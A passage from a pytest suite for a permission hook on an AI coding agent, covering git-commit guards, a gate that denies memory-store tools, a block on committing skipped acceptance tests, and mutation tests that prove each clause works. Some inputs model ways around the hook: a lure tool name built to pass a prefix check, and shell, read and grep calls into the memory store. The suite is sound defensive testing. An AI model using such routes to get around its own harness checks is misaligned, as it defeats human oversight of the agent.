        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 2, "the multi-commit assertion must red on a recomputed SHA"
    assert "Marker-freshness guard" in _reason(out)


def test_mutant_freshness_scoped_to_checklist_allows_light_stale_marker(
    tmp_path: Path,
) -> None:
    """Twin: scope the clause to the production profile the way the sibling
    un-skip clause is scoped. Under the lighter profile no checklist exists, the
    clause stops firing, and the stale marker is allowed — so the
    profile-independence assertion reds. This is the realistic regression: the
    profile-scoped sibling lives in the same commit block."""
    mutant = _write_mutant(
        tmp_path,
        "freshness_scoped",
        _FRESHNESS_CALL_SITE,
        '        if (impl / f"atdd-checklist-{story}.md").is_file():\n'
        "            _marker_freshness_gate(marker, baseline)",
    )
    repo, impl = _green_story_repo(tmp_path, stage=True, marker_sha=_STALE_SHA)
    assert not (impl / "atdd-checklist-STORY-1.md").exists()

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0, "the profile-independence assertion must red once scoped"
    assert out is None

    # Control: with a checklist on disk the scoped clause fires again, so the
    # mutation really is a scoping change and not a wholesale deletion.
    (impl / "atdd-checklist-STORY-1.md").write_text("# checklist\n")
    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 2
    assert "Marker-freshness guard" in _reason(out)


def test_non_git_bash_is_allowed(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")
    event = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "npm test"},
        "cwd": str(repo),
    }

    code, out = _run_hook(event, repo)

    assert code == 0
    assert out is None


def test_non_bash_tool_is_allowed(tmp_path: Path) -> None:
    event = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Edit",
        "tool_input": {"file_path": "x", "old_string": "a", "new_string": "b"},
        "cwd": str(tmp_path),
    }
    code, out = _run_hook(event, tmp_path)
    assert code == 0
    assert out is None


# ---------------------------------------------------------------------------
# Cross-Session Recall gate — the claude-mem latch path.
#
# The gate is armed by a .mem-state.json latch under impl-artifacts; tests point
# ULTRACODE_IMPL_ARTIFACTS at tmp_path so the latch (and its absence) is fully
# controlled per-test. _GREEN_STATE is a v1 latch that was green by the old
# rules (present + schema_ok True + recall on). Since latch v2 no latch state
# permits claude-mem: it denies like every other present latch. The v2
# store-path rule has its own section at the end of this file.
# ---------------------------------------------------------------------------

_GREEN_STATE = {
    "latch_version": 1,
    "run_id": "RUN-7",
    "claude_mem": "present",
    "schema_ok": True,
    "recall": "on",
    "tool_form": "plugin",
    "fingerprint": "abc123def4567890",
    "created_at": "2026-06-04T00:00:00Z",
}

# Live plugin-install MCP tool names (captured this session) + the lure that
# tries to smuggle a non-claude-mem op past a sloppy prefix check.
_MEM_PLUGIN_TOOLS = (
    "mcp__plugin_claude-mem_mcp-search__search",
    "mcp__plugin_claude-mem_mcp-search__save_observation",
    "mcp__plugin_claude-mem_mcp-search____IMPORTANT",
)
# Bare-server install forms (dash and underscore server segments).
_MEM_BARE_TOOLS = (
    "mcp__claude-mem__search",
    "mcp__claude_mem__search",
)
# Look-alikes that MUST NOT be treated as claude-mem (memoir != mem; memory !=
# the bare server segment; an unrelated server entirely).
_NON_MEM_TOOLS = (
    "mcp__plugin_claude-memoir_x__y",
    "mcp__claude-memory__z",
    "mcp__Neon__run_sql",
)


def _write_state(impl: Path, state) -> None:
    impl.mkdir(parents=True, exist_ok=True)
    if isinstance(state, (dict, list)):
        (impl / ".mem-state.json").write_text(json.dumps(state))
    else:
        (impl / ".mem-state.json").write_text(state)  # raw bytes-as-str payloads


def _mem_event(tool_name: str, cwd: Path, tool_input: dict | None = None) -> dict:
    return {
        "hook_event_name": "PreToolUse",
        "tool_name": tool_name,
        "tool_input": tool_input if tool_input is not None else {},
        "cwd": str(cwd),
    }


def _assert_mem_denied(code: int, out: dict | None) -> None:
    assert code == 2
    assert out is not None
    decision = out["hookSpecificOutput"]
    assert decision["permissionDecision"] == "deny"
    assert "Cross-Session Recall guard" in decision["permissionDecisionReason"]


# --- risk: an absent latch (no active run) must never touch claude-mem -------

def test_risk_no_latch_allows_claude_mem_and_git_guards_intact(tmp_path: Path) -> None:
    # No .mem-state.json at all: the user is outside any UCG run. A claude-mem
    # MCP call sails through, AND the existing git guard still fires.
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")
    impl = tmp_path / "impl"  # deliberately no state file written

    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    assert code == 0
    assert out is None

    # Same absent-latch world: protected-branch git guard unchanged.
    gcode, gout = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert gcode == 2
    assert "Protected-branch" in gout["hookSpecificOutput"]["permissionDecisionReason"]


# --- risk: no latch state permits claude-mem any more ------------------------
# Was test_risk_green_latch_allows_claude_mem_call. latch-and-guard.md, Guard
# item 1: "There is no green path", and it names this test among those that
# "Become denies".

def test_risk_green_latch_denies_claude_mem_call(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, _GREEN_STATE)  # green by the old v1 rules
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


# --- risk: every not-green latch shape must fail closed (deny) ---------------

def test_risk_recall_off_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_claude_mem_absent_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "claude_mem": "absent"})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_schema_ok_false_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "schema_ok": False})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_zero_byte_state_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, "")  # zero-byte latch -> fail closed
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_malformed_json_state_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, "{not: valid json,,,")  # unparseable -> fail closed
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_type_mismatch_state_denies(tmp_path: Path) -> None:
    # schema_ok as the *string* "true" and recall as the *number* 1 must NOT
    # satisfy the strict-bool / strict-str predicates.
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "schema_ok": "true", "recall": 1})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_future_latch_version_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "latch_version": 99})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


# --- risk: the matcher must hit every live claude-mem form, including the lure

@pytest.mark.parametrize("tool_name", _MEM_PLUGIN_TOOLS + _MEM_BARE_TOOLS)
def test_risk_matcher_hits_live_claude_mem_names(tmp_path: Path, tool_name: str) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green -> must deny
    code, out = _run_hook(
        _mem_event(tool_name, tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


# --- risk: the matcher must NOT over-reach onto look-alike tool names ---------

@pytest.mark.parametrize("tool_name", _NON_MEM_TOOLS)
def test_risk_matcher_ignores_lookalike_names(tmp_path: Path, tool_name: str) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    code, out = _run_hook(
        _mem_event(tool_name, tmp_path, {"query": "x"}),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    # Not a claude-mem tool and not a filesystem reach-around -> allowed through.
    assert code == 0
    assert out is None


# --- risk: empty / missing tool_name is not a match -> allowed ---------------

def test_risk_empty_tool_name_allowed(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    code, out = _run_hook(_mem_event("", tmp_path), tmp_path,
                          {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    assert code == 0
    assert out is None


def test_risk_missing_tool_name_allowed(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    event = {"hook_event_name": "PreToolUse", "tool_input": {}, "cwd": str(tmp_path)}
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    assert code == 0
    assert out is None


# --- risk: filesystem reach-arounds into the claude-mem store ----------------

def test_risk_not_green_denies_bash_touching_claude_mem(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    event = _mem_event(
        "Bash", tmp_path, {"command": "sqlite3 ~/.claude-mem/store.db '.tables'"}
    )
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    _assert_mem_denied(code, out)


def test_risk_not_green_denies_read_of_claude_mem_path(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    event = _mem_event(
        "Read", tmp_path, {"file_path": "/home/u/.claude-mem/x.json"}
    )
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    _assert_mem_denied(code, out)


def test_risk_not_green_denies_grep_under_claude_mem_path(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    event = _mem_event(
        "Grep", tmp_path, {"pattern": "secret", "path": "/home/u/.claude-mem"}
    )
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    _assert_mem_denied(code, out)


# Was test_risk_green_latch_allows_filesystem_claude_mem_access, inverted by the
# same Guard item 1 line ("Become denies").
def test_risk_green_latch_denies_filesystem_claude_mem_access(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, _GREEN_STATE)  # green by the old v1 rules: still denied
    for event in (
        _mem_event("Bash", tmp_path, {"command": "ls ~/.claude-mem"}),
        _mem_event("Read", tmp_path, {"file_path": "/home/u/.claude-mem/x.json"}),
        _mem_event("Grep", tmp_path, {"pattern": "x", "path": "/home/u/.claude-mem"}),
    ):
        code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
        _assert_mem_denied(code, out)


def test_risk_no_latch_allows_filesystem_claude_mem_access(tmp_path: Path) -> None:
    impl = tmp_path / "impl"  # no state file -> not an active run
    for event in (
        _mem_event("Bash", tmp_path, {"command": "ls ~/.claude-mem"}),
        _mem_event("Read", tmp_path, {"file_path": "/home/u/.claude-mem/x.json"}),
        _mem_event("Grep", tmp_path, {"pattern": "x", "path": "/home/u/.claude-mem"}),
    ):
        code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
        assert code == 0, event["tool_name"]
        assert out is None, event["tool_name"]


# --- risk: deleting the latch mid-run reverts to absent semantics (allow) -----

def test_risk_latch_deleted_between_calls_behaves_as_absent(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green: would deny

    first_code, first_out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(first_code, first_out)

    # Stage 6 Finalize removes the latch (no caching across calls): now allow.
    (impl / ".mem-state.json").unlink()
    second_code, second_out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    assert second_code == 0
    assert second_out is None

# --- risk: unknowable run state must fail closed for claude-mem calls --------

def test_risk_unresolvable_impl_artifacts_fails_closed_for_claude_mem(tmp_path: Path) -> None:
    # Event carries NO cwd and ULTRACODE_IMPL_ARTIFACTS is unset (empty): the
    # latch location is unknowable — not provably absent. A claude-mem call
    # must DENY (uncertain implies deny), while a non-claude-mem tool passes
    # through untouched. Regression for the review fail-open finding.
    event = {
        "hook_event_name": "PreToolUse",
        "tool_name": "mcp__plugin_claude-mem_mcp-search__save_observation",
        "tool_input": {},
    }
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": ""})
    _assert_mem_denied(code, out)

    benign = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "ls"},
    }
    bcode, bout = _run_hook(benign, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": ""})
    assert bcode == 0
    assert bout is None


# ---------------------------------------------------------------------------
# Un-skip proof: the staged CONTENT of the story's acceptance tests.
#
# In production the story's atdd-checklist names the acceptance-test files; the
# guard reads each one's staged post-image (`git show :<path>`) and refuses a
# commit while any still carries the skip marker. These tests drive the real
# thing: a temp repo with real staged blobs and a real checklist on disk.
#
# Two obligations run through the whole section:
#   - always stage something real, so the empty-index clause cannot deny first
#     and make every assertion below pass against the wrong deny; and
#   - assert on the deny MESSAGE, not merely on the exit code.
# ---------------------------------------------------------------------------

_ACCEPTANCE_REL = "tests/acceptance/login.spec.ts"
_CHECKLIST_NAME = "atdd-checklist-STORY-1.md"

# The clean blob deliberately carries the bare word "skip" in a position that is
# NOT a skip marker (the describe name). That property is what makes a guard
# widened to match the bare substring visibly over-fire; the allow-path test
# asserts the property on its own fixture so a later tidy-up cannot quietly
# remove it and turn the corresponding mutant into a no-op.
_CLEAN_ACCEPTANCE = (
    'describe("skip-free acceptance path", () => {\n'
    '  test("logs the user in", async () => {\n'
    "    expect(await login()).toBe(true);\n"
    "  });\n"
    "});\n"
)
_SKIPPED_ACCEPTANCE = (
    'describe("acceptance path", () => {\n'
    '  test.skip("logs the user in", async () => {\n'
    "    expect(await login()).toBe(true);\n"
    "  });\n"
    "});\n"
)


def _checklist_body(*rels: str) -> str:
    """A checklist in the shape the test-design stage writes: prose plus the
    acceptance-test paths it maps each criterion onto."""
    lines = ["# Acceptance checklist for STORY-1", ""]
    for index, rel in enumerate(rels, start=1):
        lines.append(f"- criterion {index} -> `{rel}` (red-phase, must be green)")
    return "\n".join(lines) + "\n"


def _production_repo(
    tmp_path: Path,
    *,
    staged: dict[str, str] | None = None,
    committed: dict[str, str] | None = None,
    checklist: str | None = None,
    artifacts_dirname: str = "test-artifacts",
) -> tuple[Path, Path, Path]:
    """A green-story repo plus a TEA test-artifacts root holding the checklist.

    `committed` lands in HEAD first (so a re-add can be modelled), `staged` is
    written and staged afterwards by an explicit `git add <path>`, the way the
    guard requires staging to happen: in its own prior step.
    """
    repo, impl = _green_story_repo(tmp_path, stage=False)
    tests_root = repo / artifacts_dirname
    tests_root.mkdir(parents=True, exist_ok=True)
    if checklist is not None:
        (tests_root / _CHECKLIST_NAME).write_text(checklist)
    for rel, body in (committed or {}).items():
        target = repo / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(body)
        _git(repo, "add", rel)
    if committed:
        _git(repo, "commit", "-q", "-m", "prior story work")
    for rel, body in (staged or {}).items():
        target = repo / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(body)
        _git(repo, "add", rel)
    return repo, impl, tests_root


def _production_env(impl: Path, tests_root: Path) -> dict:
    return {
        "ULTRACODE_IMPL_ARTIFACTS": str(impl),
        "ULTRACODE_TEST_ARTIFACTS": str(tests_root),
    }


def test_unskip_clean_staged_acceptance_test_allowed(tmp_path: Path) -> None:
    # Fixture property this test's mutant depends on, asserted rather than
    # assumed: the clean blob carries the bare word "skip" outside any marker.
    assert "skip" in _CLEAN_ACCEPTANCE, "fixture must contain the bare substring"
    assert "test.skip(" not in _CLEAN_ACCEPTANCE, "...but no real skip marker"

    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0, "un-skipped acceptance tests: the commit is a green boundary"
    assert out is None


def test_unskip_staged_skip_marker_denied_on_first_commit(tmp_path: Path) -> None:
    # First commit for this file: it is a freshly added, all-plus blob with no
    # prior version anywhere in history, so nothing could be diffed against.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "Un-skip proof" in _reason(out)


def test_unskip_deny_message_names_clause_files_and_recovery(tmp_path: Path) -> None:
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    _, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    reason = _reason(out)
    assert "Un-skip proof" in reason  # names the failing clause...
    assert "Empty-index guard" not in reason  # ...and is not the sibling clause
    assert _ACCEPTANCE_REL in reason  # the offending file
    assert "test.skip(" in reason  # what was found in it
    assert "Un-skip every acceptance test" in reason  # the recovery
    assert "restage" in reason and "SEPARATE tool call" in reason


def test_unskip_inert_without_atdd_checklist(tmp_path: Path) -> None:
    # In scope (the test-artifacts root resolves to a real directory) but the
    # story has no checklist: the lighter profile, where acceptance tests are
    # never generated. This exercises the checklist-missing branch itself.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"story.txt": "story work"},
        checklist=None,
    )
    assert tests_root.is_dir()
    assert not (tests_root / _CHECKLIST_NAME).exists()

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0
    assert out is None


def test_unskip_readded_skip_marker_denied(tmp_path: Path) -> None:
    # The marker was absent in HEAD and is back in the staged blob. A diff-wise
    # reading ("was a pre-existing marker removed?") waves this through; reading
    # the staged content does not.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        committed={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    assert "Un-skip proof" in _reason(out)
    assert _ACCEPTANCE_REL in _reason(out)


def test_unskip_absent_marker_control_allowed(tmp_path: Path) -> None:
    # Same history shape as the re-add above, minus the marker in the staged
    # blob: the commit is allowed. The pair is what shows the clause keys on
    # content presence rather than on the direction of the change.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        committed={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE + "// one more assertion\n"},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0
    assert out is None


def test_unskip_guard_docstring_notes_js_vitest_only_token(tmp_path: Path) -> None:
    src = _hook_source()
    doc = src[src.index('"""'):src.index('"""', src.index('"""') + 3)]

    def _states_the_caveat(text: str) -> bool:
        return "test.skip(" in text and re.search(
            r"JS/Vitest-specific|JS/Vitest specific", text
        ) is not None

    assert _states_the_caveat(doc), "the guard docstring must scope the token"
    assert "pytest" in doc and "Go" in doc, "and name a stack it does not cover"

    # Anti-vacuous: strip the caveat sentence and the same predicate fails, so
    # the assertion is not satisfied by prose that predates this check.
    caveat_start = doc.index("  Skip token matched:")
    stripped = doc[:caveat_start]
    assert not _states_the_caveat(stripped)


def _env_unset_repo(tmp_path: Path) -> tuple[Path, Path, Path]:
    """A repo whose checklist and skip-carrying staged test sit at exactly the
    path a cwd-derived test-artifacts fallback would resolve to.

    Load-bearing: without the planted checklist, a resolver that invented that
    fallback would find nothing, go inert for want of a checklist, and the
    unset-env test would stay green while the defect shipped.
    """
    return _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
        artifacts_dirname="_bmad-output/test-artifacts",
    )


def test_unskip_inert_when_test_artifacts_env_unset(tmp_path: Path) -> None:
    repo, impl, tests_root = _env_unset_repo(tmp_path)
    # The fixture properties the corresponding mutant needs, asserted here:
    assert tests_root == repo / "_bmad-output" / "test-artifacts"
    assert (tests_root / _CHECKLIST_NAME).is_file()
    assert "test.skip(" in (repo / _ACCEPTANCE_REL).read_text()

    # Hooks armed by a run that predates this check inject no test-artifacts
    # root. Out of scope must mean no decision at all, never a deny.
    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 0
    assert out is None


def test_unskip_inert_note_goes_to_stderr_not_stdout(tmp_path: Path) -> None:
    repo, impl, _ = _env_unset_repo(tmp_path)

    proc = _hook_proc(
        HOOK, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert proc.returncode == 0
    assert proc.stdout.strip() == "", "stdout is the decision channel and stays clean"
    assert "ULTRACODE_TEST_ARTIFACTS is unset" in proc.stderr
    assert proc.stderr.count("Un-skip proof") == 1, "one note per invocation"


def _function_source(src: str, name: str) -> str:
    start = src.index(f"def {name}(")
    return src[start:src.index("\ndef ", start + 1)]


def _code_only(fn_src: str) -> str:
    """The function's code with its docstring and comment lines removed."""
    kept, in_doc = [], False
    for line in fn_src.splitlines():
        stripped = line.strip()
        if in_doc:
            if stripped.endswith('"""'):
                in_doc = False
            continue
        if stripped.startswith('"""'):
            if not (len(stripped) > 3 and stripped.endswith('"""')):
                in_doc = True
            continue
        if stripped.startswith("#"):
            continue
        kept.append(line)
    return "\n".join(kept)


def _resolver_derives_a_path(hook_src: str) -> bool:
    """True when the test-artifacts resolver invents a path from cwd instead of
    returning None when the env var is unset."""
    return "cwd" in _code_only(_function_source(hook_src, "_test_artifacts"))


def test_unskip_test_artifacts_resolver_has_no_cwd_fallback() -> None:
    src = _hook_source()
    resolver = _function_source(src, "_test_artifacts")
    assert "ULTRACODE_TEST_ARTIFACTS" in resolver
    # No cwd is even in scope: unset must resolve to None, out of scope.
    assert resolver.splitlines()[0] == "def _test_artifacts() -> Path | None:"
    assert not _resolver_derives_a_path(src)
    assert "return None" in _code_only(resolver)
    # Anti-vacuous: the sibling resolver DOES carry the fallback shape this one
    # must not, so the check is discriminating rather than trivially true.
    assert "cwd" in _code_only(_function_source(src, "_impl_artifacts"))


def test_unskip_unreadable_checklist_denies(tmp_path: Path) -> None:
    # The staged blob is CLEAN: absent the read failure this commit is allowed,
    # so the deny can only come from the unreadable checklist.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )
    checklist = tests_root / _CHECKLIST_NAME
    checklist.write_bytes(b"\xff\xfe not decodable \x00\x9c")

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    reason = _reason(out)
    assert "Un-skip proof" in reason and "could not be read" in reason
    assert "Empty-index guard" not in reason

    # Second unreadable shape, exercised only where file modes actually bite
    # (a root runner ignores them, and a conditional beats a silent skip).
    checklist.write_text(_checklist_body(_ACCEPTANCE_REL))
    checklist.chmod(0o000)
    if not os.access(checklist, os.R_OK):
        code, out = _run_hook(
            _commit_event(repo), repo, _production_env(impl, tests_root)
        )
        assert code == 2
        assert "could not be read" in _reason(out)
    checklist.chmod(0o644)


def test_unskip_git_show_failure_denies_naming_failure(tmp_path: Path) -> None:
    # The checklist names a file that is not in the index at all, so the staged
    # read cannot answer. Something else IS staged, so the empty-index clause
    # passes and this deny is unambiguously the staged-read failure.
    missing = "tests/acceptance/missing.spec.ts"
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"story.txt": "story work"},
        checklist=_checklist_body(missing),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    reason = _reason(out)
    assert "Un-skip proof" in reason
    assert "git show :" in reason and missing in reason  # names the failure
    assert "Empty-index guard" not in reason


def test_unskip_checklist_with_no_test_files_is_inert(tmp_path: Path) -> None:
    # A real production story that ships no acceptance-test file (documentation,
    # a refactor): its checklist enumerates nothing, and that is not a fault.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"docs/notes.md": "prose only\n"},
        checklist="# Acceptance checklist for STORY-1\n\nNo acceptance tests: docs only.\n",
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0, "a doc-only story must not be blocked by the un-skip proof"
    assert out is None


# --- Executed mutants of the un-skip clause ---------------------------------
# One mutation per branch, each on a COPY of the hook under tmp_path, each
# proving the branch it neuters is the thing producing the behavior above.

_UNSKIP_TOKEN_TEST = "        if _SKIP_TOKEN in blob:"
_UNSKIP_DENY = "    if still_skipped:\n        _deny(\n"
_UNSKIP_NO_CHECKLIST = (
    "    if not checklist.is_file():\n"
    "        return  # no acceptance tests for this story: nothing to prove"
)
_UNSKIP_NO_FILES = (
    "    if not files:\n"
    "        return  # checklist names no acceptance-test file (doc-only story)"
)
_UNSKIP_UNREADABLE = "    except (OSError, UnicodeDecodeError):\n        _deny(\n"
_UNSKIP_UNREADABLE_STAGED = "        if not readable:\n            _deny(\n"
_TEST_ARTIFACTS_DEF = "def _test_artifacts() -> Path | None:"
_TEST_ARTIFACTS_TAIL = (
    '    env = os.environ.get("ULTRACODE_TEST_ARTIFACTS")\n'
    "    if env:\n"
    "        return Path(env)\n"
    "    return None"
)
_TEST_ARTIFACTS_CALL = "    tests_root = _test_artifacts()"


def _write_mutant_multi(tmp_path: Path, name: str, edits: list[tuple[str, str]]) -> Path:
    """Copy the shipped hook, apply several textual edits that together make ONE
    behavioral change, return the copy."""
    src = _hook_source()
    for old, new in edits:
        assert old in src, f"mutation anchor drifted out of the hook: {name}"
        src = src.replace(old, new, 1)
    path = tmp_path / f"mutant_{name}.py"
    path.write_text(src, encoding="utf-8")
    return path


def test_mutant_bare_skip_substring_reds_clean_acceptance_commit(tmp_path: Path) -> None:
    """Twin: widen the match from the `test.skip(` token to the bare substring
    `skip`. The clean blob then denies, so the allow-path assertion reds — which
    is what proves that assertion pins the token rather than passing because the
    clause never ran."""
    mutant = _write_mutant(
        tmp_path, "bare_skip", _UNSKIP_TOKEN_TEST, '        if "skip" in blob:'
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 2, "the allow-path assertion must red when the match widens"
    assert "Un-skip proof" in _reason(out)


def test_mutant_unskip_note_instead_of_deny_allows_skipped_commit(tmp_path: Path) -> None:
    """Twin: swap the deny for the out-of-scope note-and-return path. The
    freshly added, still-skipped blob is then allowed and both deny assertions
    red."""
    mutant = _write_mutant(
        tmp_path,
        "unskip_note",
        _UNSKIP_DENY,
        '    if still_skipped:\n        _note("mutant: note instead of deny")\n'
        "        return\n        _deny(\n",
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 0, "both staged-marker deny assertions must red"
    assert out is None


def test_mutant_missing_checklist_denies_reds_light_profile_commit(tmp_path: Path) -> None:
    """Twin: fail closed when the checklist is absent instead of going inert.
    The lighter profile's commit then denies, reddening exactly that inertness
    assertion."""
    mutant = _write_mutant(
        tmp_path,
        "checklist_missing_deny",
